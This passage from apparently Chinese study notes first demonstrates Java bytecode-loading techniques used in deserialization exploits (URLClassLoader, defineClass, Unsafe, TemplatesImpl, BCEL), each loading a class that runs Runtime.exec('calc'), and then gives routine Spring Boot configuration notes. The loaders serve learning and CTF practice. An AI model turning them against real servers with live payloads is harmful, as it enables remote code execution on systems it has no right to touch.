class="hljs-subst">\\</span>production<span class="hljs-subst">\\</span>rmi<span class="hljs-subst">\\</span>com<span class="hljs-subst">\\</span>ctf<span class="hljs-subst">\\</span>bcel&quot;</span>)&#125;);        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).newInstance();    &#125;     <span class="hljs-comment">//包名.类名</span>&#125;</code></pre></div><p>http:&#x2F;&#x2F;     python起一个http服务</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;http://127.0.0.1:8000&quot;</span>)&#125;);        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();    &#125;     <span class="hljs-comment">//包名.类名</span>&#125;</code></pre></div><p>将我们之前的 class 文件打包一下，打包为 jar 文件。</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jar </span>-cvf calc.<span class="hljs-keyword">jar </span>clac.class</code></pre></div><p>file + jar协议</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:file:///E:\\Calc.jar!/&quot;</span>)&#125;);        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();    &#125;     <span class="hljs-comment">//包名.类名</span>&#125;</code></pre></div><p>http + jar协议</p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDemo</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) throws Exception &#123;        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> <span class="hljs-type">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;</span>)&#125;);        urlClassLoader.loadClass(<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>();    &#125;     <span class="hljs-comment">//包名.类名</span>&#125;</code></pre></div><h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><h3 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h3><div class="code-wrapper"><pre><code class="hljs reasonml">define<span class="hljs-constructor">Class(String <span class="hljs-params">name</span>,<span class="hljs-params">byte</span>[] <span class="hljs-params">b</span>,<span class="hljs-params">int</span> <span class="hljs-params">off</span>,<span class="hljs-params">int</span> <span class="hljs-params">len</span>)</span><span class="hljs-comment">//name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> BCELDemo &#123;    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;        ClassLoader systemClassLoader = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>;        Method <span class="hljs-keyword">method</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.<span class="hljs-params">class</span>, <span class="hljs-params">byte</span>[].<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>, <span class="hljs-params">int</span>.<span class="hljs-params">class</span>)</span>;        <span class="hljs-keyword">method</span>.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;        byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;C:\\Users\\86136\\Desktop\\rmi\\out\\production\\rmi\\com\\ctf\\bcel\\calc.class&quot;</span>)</span>);        Class c = (Class) <span class="hljs-keyword">method</span>.invoke(systemClassLoader,<span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);        c.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;    &#125;&#125;</code></pre></div><h3 id="Unsafe-的defineClass"><a href="#Unsafe-的defineClass" class="headerlink" title="Unsafe 的defineClass"></a>Unsafe 的defineClass</h3><div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BCELDemo</span> &#123;    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;        <span class="hljs-title class_">ClassLoader</span> classLoader <span class="hljs-operator">=</span> <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">getSystemClassLoader</span>();        <span class="hljs-title class_">Class</span><span class="hljs-operator">&lt;</span><span class="hljs-title class_">Unsafe</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Unsafe</span>.<span class="hljs-property">class</span>;        <span class="hljs-title class_">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);        <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);        <span class="hljs-title class_">Unsafe</span> classUnsafe <span class="hljs-operator">=</span> (<span class="hljs-title class_">Unsafe</span>) <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">get</span>(<span class="hljs-literal">null</span>);        <span class="hljs-title class_">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getMethod</span>(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-title class_">String</span>.<span class="hljs-property">class</span>, <span class="hljs-variable">byte</span>[].<span class="hljs-property">class</span>,                int.<span class="hljs-property">class</span>, int.<span class="hljs-property">class</span>, <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ProtectionDomain</span>.<span class="hljs-property">class</span>);        <span class="hljs-variable">byte</span>[] <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Files</span>.<span class="hljs-property">readAllBytes</span>(<span class="hljs-title class_">Paths</span>.<span class="hljs-property">get</span>(<span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>86136<span class="hljs-char escape_">\\</span>Desktop<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>out<span class="hljs-char escape_">\\</span>production<span class="hljs-char escape_">\\</span>rmi<span class="hljs-char escape_">\\</span>com<span class="hljs-char escape_">\\</span>ctf<span class="hljs-char escape_">\\</span>bcel<span class="hljs-char escape_">\\</span>calc.class&quot;</span>));        <span class="hljs-title class_">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (<span class="hljs-title class_">Class</span>) <span class="hljs-variable">defineClassMethod</span>.<span class="hljs-property">invoke</span>(classUnsafe, <span class="hljs-string">&quot;com.ctf.bcel.calc&quot;</span>, <span class="hljs-variable">code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">code</span>.<span class="hljs-property">length</span>, classLoader, <span class="hljs-literal">null</span>);        <span class="hljs-variable">calc</span>.<span class="hljs-property">newInstance</span>();    &#125;&#125;</code></pre></div><h2 id="TemplatesImpl-加载字节码-！！！！"><a href="#TemplatesImpl-加载字节码-！！！！" class="headerlink" title="TemplatesImpl 加载字节码      ！！！！"></a>TemplatesImpl 加载字节码      ！！！！</h2><div class="code-wrapper"><pre><code class="hljs leaf">TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newTransformer</span><span class="hljs-params">()</span></span> -&gt;TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span></span> -&gt; TemplatesImpl<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span></span>-&gt; TransletClassLoader<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">defineClass</span><span class="hljs-params">()</span></span></code></pre></div><p><code>TemplatesImpl#getOutputProperties()</code> <code>TemplatesImpl#newTransformer()</code></p><p>可以利用这两个去构造poc</p><p>首先先构造字节码，注意，这里的字节码必须继承<code>AbstractTranslet</code>，因为继承了这一抽象类，所以必须要重写一下里面的方法</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ctf.bcel;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-built_in">super</span>();        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> TemplatesRce &#123;      public static void main(String<span class="hljs-literal">[]</span> args) throws Exception&#123;          byte<span class="hljs-literal">[]</span> code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Files</span>.</span></span>read<span class="hljs-constructor">AllBytes(Paths.<span class="hljs-params">get</span>(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>)</span>);   TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;   set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>)</span>;   set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">code</span>&#125;)</span>;   set<span class="hljs-constructor">FieldValue(<span class="hljs-params">templates</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">new</span> TransformerFactoryImpl()</span>);   templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;   &#125;      public static void set<span class="hljs-constructor">FieldValue(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">fieldName</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;          Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;   field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;   field.set(obj, value);   &#125;  &#125;</code></pre></div><h2 id="BCEL-加载字节码"><a href="#BCEL-加载字节码" class="headerlink" title="BCEL 加载字节码"></a>BCEL 加载字节码</h2><p>通过 BCEL 提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： <code>Repository</code> 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； <code>Utility</code> 用于将原生的字节码转换成BCEL格式的字节码：</p><div class="code-wrapper"><pre><code class="hljs reasonml">JavaClass cls = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Repository</span>.</span></span>lookup<span class="hljs-constructor">Class(Evil.<span class="hljs-params">class</span>)</span>;String code = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Utility</span>.</span></span>encode(cls.get<span class="hljs-constructor">Bytes()</span>, <span class="hljs-literal">true</span>);<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code);<span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassLoader()</span>.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + <span class="hljs-params">code</span>)</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;     <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;      <span class="hljs-keyword">static</span> &#123;          <span class="hljs-keyword">try</span> &#123;              Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);   &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;              e.printStackTrace();   &#125;      &#125;  &#125;</code></pre></div><h2 id="读p神文章"><a href="#读p神文章" class="headerlink" title="读p神文章"></a>读p神文章</h2><p>编译.xsl生成.class</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，它在<code>defineClass</code>中需要的字节码所对应的基类，就是这里的<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><p>XSLT在使用时会先编译成Java字节码，这也就是为什么<code>TemplatesImpl</code>会使用<code>defineClass</code>的原因</p><h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="创建程序"><a href="#创建程序" class="headerlink" title="创建程序"></a>创建程序</h2><p>首先安装好maven，我修改了maven的repository的位置，所以要在settings.xml中修改，修改完后关键是<code>mvn help system</code>下载<code>repository</code>里的文件（自行上网查吧）</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161000684.png" alt="image-20230913161000684"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160546330.png" alt="image-20230913160546330"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913160804466.png" alt="image-20230913160804466"></p><p>高版本springboot需要java的高版本，我这java8用的是2.2.0（生成后手动改的）</p><p>只选择spring web就够了</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913161643123.png" alt="image-20230913161643123"></p><h2 id="算了，不太会讲，就记录知识吧"><a href="#算了，不太会讲，就记录知识吧" class="headerlink" title="算了，不太会讲，就记录知识吧"></a>算了，不太会讲，就记录知识吧</h2><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span>    <span class="hljs-comment">//标明这是配置类</span><span class="hljs-variable">@Bean</span>     <span class="hljs-comment">//给容器中添加组件</span><span class="hljs-variable">@Component</span>   <span class="hljs-comment">//注册</span><span class="hljs-variable">@Controller</span>、<span class="hljs-variable">@Service</span>、<span class="hljs-variable">@Repository</span><span class="hljs-variable">@ComponentScan</span>、<span class="hljs-variable">@Import</span><span class="hljs-variable">@ConditionalOnxxxxx</span>满足Conditional指定的条件，则进行组件注入<span class="hljs-variable">@ImportResource</span>(<span class="hljs-string">&quot;classpath:beans.xml&quot;</span>)<span class="hljs-variable">@ConfigurationProperties</span>(prefix=<span class="hljs-string">&quot;&quot;</span>)    <span class="hljs-comment">//能够在配置文件中赋值</span><span class="hljs-variable">@AutoConfigurationPackage</span><span class="hljs-variable">@Import</span>(AutoConfigurationImportSelector.class)SpringBoot先加载所有的自动配置类 xxxxxAutoConfiguration每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。xxxxProperties里面拿。xxxProperties和配置文件进行了绑定生效的配置类就会给容器中装配很多组件</code></pre></div><div class="code-wrapper"><pre><code class="hljs dts">设置静态资源访问目录<span class="hljs-symbol"></span><span class="hljs-symbol">spring:</span><span class="hljs-symbol">  mvc:</span>    static-path-pattern: <span class="hljs-keyword">/res/</span>**</code></pre></div><p>启动程序主要是这三个东西<code>@SpringBootApplication</code>、<code>SpringApplication</code>和<code>run</code></p><p>充当配置文件的<code>application.properties</code>也可以是<code>application.yml</code></p><p>在启动程序Application的同级目录下创建controller文件夹，在这写有关路由的东西</p><p>@Controller (返回页面)     @RestController(返回内容)</p><p>在<code>application.properties</code>中能配置端口<code>server.port=8081</code></p><p>自动装配原理</p><p>yaml</p><div class="code-wrapper"><pre><code class="hljs applescript">大小写敏感使用缩进表示层级关系缩进不允许使用<span class="hljs-literal">tab</span>，只允许空格缩进的空格数不重要，只要同级元素左对齐即可<span class="hljs-comment">#表示注释</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Person</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zero$&#123;random.uuid&#125;&#125;</span>  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <span class="hljs-attribute">birth</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2018/11/02</span>  <span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">wow</span>    <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">12</span><span class="hljs-attribute">server</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">port</span><span class="hljs-punctuation">:</span> <span class="hljs-string">8082</span><span class="hljs-attribute">dog</span><span class="hljs-punctuation">:</span>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pop</span>  <span class="hljs-attribute">age</span><span class="hljs-punctuation">:</span> <span class="hljs-string">321</span><span class="hljs-comment">#Human: [&quot;myname&quot;,&quot;myage&quot;,&quot;nothing&quot;]</span><span class="hljs-comment">#Hulman: [&quot;myname&quot;,&quot;youage&quot;,&quot;everything&quot;,[1,2,3]]</span><span class="hljs-attribute">Hulman</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">myname</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">youage</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">everything</span>  <span class="hljs-bullet">-</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">2</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">3</span>      <span class="hljs-comment">#companies: [&#123;id: 1,name: asd&#125;,&#123;id: 2,name: sdf&#125;]</span><span class="hljs-attribute">companies</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span>    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">asd</span>  <span class="hljs-bullet">-</span>    <span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">2</span>    <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sdf</span><span class="hljs-attribute">boolean</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">true</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">false</span><span class="hljs-attribute">float</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">3.14</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">1.14</span><span class="hljs-attribute">int</span><span class="hljs-punctuation">:</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">1</span>  <span class="hljs-bullet">-</span> <span class="hljs-string">2</span></code></pre></div><h3 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h3><p>使用Spring的<code>@Value</code>注解进行赋值，并且配合<code>@Component</code>注解注册bean</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163225847.png" alt="image-20230913163225847"></p><p>yaml配置文件赋值</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@ConfigurationProperties(prefix = <span class="hljs-string">&quot;dog&quot;</span>)</span></code></pre></div><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913163400091.png" alt="image-20230913163400091"></p><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">dog:</span><span class="hljs-symbol">  name:</span> pop  <span class="hljs-symbol">  age:</span> <span class="hljs-number">321</span><span class="hljs-meta">#（注意空格）</span></code></pre></div><p>properties配置文件</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-meta">@PropertySource(<span class="hljs-string">&quot;classpath:user.properties&quot;</span>)</span></code></pre></div><h3 id="松散绑定"><a href="#松散绑定" class="headerlink" title="松散绑定"></a>松散绑定</h3><p>yml中写<code>last-name</code> 与<code>lastName</code>是一样的，<code>-</code>后面跟着的字母默认是大写的</p><h3 id="JSR303校验"><a href="#JSR303校验" class="headerlink" title="JSR303校验"></a>JSR303校验</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@Validated</span>   <span class="hljs-variable">@Email</span>()   private String name;</code></pre></div><p>一般使用Pattern() 正则匹配</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164032098.png" alt="image-20230913164032098"></p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164049132.png" alt="image-20230913164049132"></p><h3 id="多个配置文件位置"><a href="#多个配置文件位置" class="headerlink" title="多个配置文件位置"></a>多个配置文件位置</h3><p>默认选择顺序</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913164744829.png" alt="image-20230913164744829"></p><p>主动选择激活配置   spring.profiles.active&#x3D;</p><p>application-名字.properties</p><p><img src="/2023/09/11/java%E5%9F%BA%E7%A1%80%E5%92%8Cspringboot/image-20230913165341467.png" alt="image-20230913165341467"></p><p>选择application-test.properties的配置</p><div class="code-wrapper"><pre><code class="hljs yaml"><span class="hljs-comment">#application.yml</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span>    <span class="hljs-attr">active:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//选择执行名字为dev的配置</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><span class="hljs-comment">#(---不是为了好看画的、起到分隔的作用)</span><span class="hljs-meta">---</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span>     <span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span>   <span class="hljs-string">//名字</span><span class="hljs-meta">---</span><span class="hljs-attr">server:</span>  <span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><span class="hljs-attr">spring:</span>  <span class="hljs-attr">profiles:</span> <span class="hljs-string">test</span></code></pre></div><h3 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h3><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-comment">//标注这是一个配置类</span><span class="hljs-variable">@Configuration</span>()   <span class="hljs-variable">@EnableConfigurationProperties</span>()<span class="hljs-comment">//根据不同的条件来判断当前配置是否生效</span><span class="hljs-variable">@ConditionalOnWebApplication</span>()<span class="hljs-variable">@ConditionalOnClass</span>()<span class="hljs-variable">@ConditionalOnProperty</span>()</code></pre></div><p>xxxxAutoConfiguration：自动配置类；给容器中添加组件</p><p>xxxxProperties:封装配置文件中相关属性</p><p>而相关属性我们可以使用配置文件进行修改</p><h2 id="web开发"><a href="#web开发" class="headerlink" title="web开发"></a>web开发</h2><p>webjars    </p><p>获取静态资源resources下放public、static、resources</p><p>优先级 resources &gt; static &gt; public</p><p>首页：在三个目录下寻找<code>index.html</code></p><p>图标：2.2版本没有，2.1版本放在三个任意一个目录下<code>favicon.ico</code></p><p>@Controller    .html文件放在template目录下</p><h3 id="thymeleaf-模板"><a href="#thymeleaf-模板" class="headerlink" title="thymeleaf 模板"></a>thymeleaf 模板</h3><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">*</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">也可和$</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">混用，星号语法对选定对象而不是整个上下文评估表达式，也就是说，只要没有选定的对象，美元($</span><span class="hljs-template-variable">&#123;…&#125;</span><span class="language-xml">)和星号(*</span><span class="hljs-template-variable">&#123;...&#125;</span><span class="language-xml">)的语法就完全一样。</span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;user&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;age&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;detail&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">//等价于</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*</span></span></span><span class="hljs-template-variable">&#123;user.name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="language-xml">    <span 